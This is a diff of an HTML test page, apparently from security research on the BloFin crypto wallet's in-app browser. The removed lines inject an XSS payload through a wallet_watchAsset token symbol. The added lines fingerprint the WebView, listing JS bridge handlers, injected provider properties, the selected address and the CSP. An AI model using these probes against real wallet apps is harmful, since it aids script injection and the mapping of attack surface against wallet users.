@@ -1,34 +1,66 @@
 <!DOCTYPE html>
 <html>
-<body style="background:black;color:white;padding:15px;font-family:monospace">
-<h3>Token Symbol XSS Test - 0x403for</h3>
-<button id="btn" style="padding:12px;background:#f5c518;color:black;font-weight:bold;border:none;border-radius:8px;width:100%">TEST ADD TOKEN XSS</button>
-<div id="log" style="color:cyan;margin-top:10px;word-break:break-all"></div>
-
+<head>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>BloFin Tech Stack - 0x403for</title>
+<style>body{background:#0a0a0a;color:#e0e0e0;font-family:monospace;padding:12px;font-size:12px}h3{color:#f5c518}pre{background:#151515;border:1px solid #333;padding:10px;border-radius:8px;white-space:pre-wrap;word-break:break-all}</style>
+</head>
+<body>
+<h3>BloFin iOS Tech Detector - 0x403for</h3>
+<pre id="log">Detecting...</pre>
 <script>
-document.getElementById('btn').onclick = async () => {
-  const log = (t) => document.getElementById('log').innerHTML += t + "<br>";
-  log("Calling wallet_watchAsset...");
-  try {
-    const result = await window.ethereum.request({
-      method: 'wallet_watchAsset',
-      params: {
-        type: 'ERC20',
-        options: {
-          address: '0x0000000000000000000000000000000000000001',
-          symbol: 'USDT<img src=x onerror=alert(1)>',
-          decimals: 18,
-          image: 'https://example.com/token.png'
-        }
-      }
-    });
-    log("Result: " + result);
-    log("SUCCESS - Sekarang tutup DApp Browser, buka BloFin > Assets / Token List");
-    log("Lihat apakah symbol jadi <img> atau alert muncul di halaman Assets BloFin.");
-  } catch(e) {
-    log("Error / Rejected: " + e.message);
-  }
-};
+const log = document.getElementById('log');
+let out = "";
+
+out += "=== USER AGENT ===\n";
+out += navigator.userAgent + "\n";
+out += "Platform: " + navigator.platform + "\n";
+out += "Vendor: " + navigator.vendor + "\n\n";
+
+out += "=== WEBVIEW TYPE ===\n";
+out += "window.webkit: " +!!window.webkit + "\n";
+out += "window.webkit.messageHandlers: " +!!window.webkit?.messageHandlers + "\n";
+if(window.webkit?.messageHandlers){
+  out += "Handlers: " + Object.keys(window.webkit.messageHandlers).join(", ") + "\n";
+}
+out += "window.ReactNativeWebView: " +!!window.ReactNativeWebView + "\n";
+out += "window.chrome: " +!!window.chrome + "\n\n";
+
+out += "=== ETHEREUM PROVIDER INJECTION ===\n";
+out += "window.ethereum: " +!!window.ethereum + "\n";
+if(window.ethereum){
+  const keys = Object.keys(window.ethereum);
+  out += "Provider keys: " + keys.join(", ").slice(0,500) + "\n";
+  out += "isBloFin/isBlofin/isMetaMask: " +
+    (window.ethereum.isBloFin||false) + "/" +
+    (window.ethereum.isBlofin||false) + "/" +
+    (window.ethereum.isMetaMask||false) + "\n";
+  out += "chainId: " + (window.ethereum.chainId||"n/a") + "\n";
+  out += "selectedAddress: " + (window.ethereum.selectedAddress||"n/a") + "\n";
+}
+out += "\n";
+
+out += "=== PROVIDER OVERRIDES (EIP-6963) ===\n";
+out += "window.ethereum.providers: " + (window.ethereum?.providers?.length || 0) + "\n";
+out += "window.phantom: " +!!window.phantom + "\n";
+out += "window.coinbaseWalletExtension: " +!!window.coinbaseWalletExtension + "\n\n";
+
+out += "=== JS BRIDGE & GLOBAL ===\n";
+const suspects = ["BloFin","blofin","__BLOFIN__","_blofin","trustWallet","Trust","coin98","Coin98"];
+suspects.forEach(k=>{
+  if(window[k]) out += "FOUND window."+k+" : "+typeof window[k]+"\n";
+});
+out += "\n";
+
+out += "=== SECURITY FEATURES ===\n";
+out += "localStorage: " +!!window.localStorage + "\n";
+out += "indexedDB: " +!!window.indexedDB + "\n";
+out += "FileReader: " +!!window.FileReader + "\n";
+out += "WebView File Access Test: " + (window.location.protocol) + "\n";
+out += "CSP: " + (document.querySelector('meta[http-equiv=Content-Security-Policy]')?.content || "none") + "\n";
+
+log.innerText = out;
+console.log(out);
 </script>
 </body>
 </html>
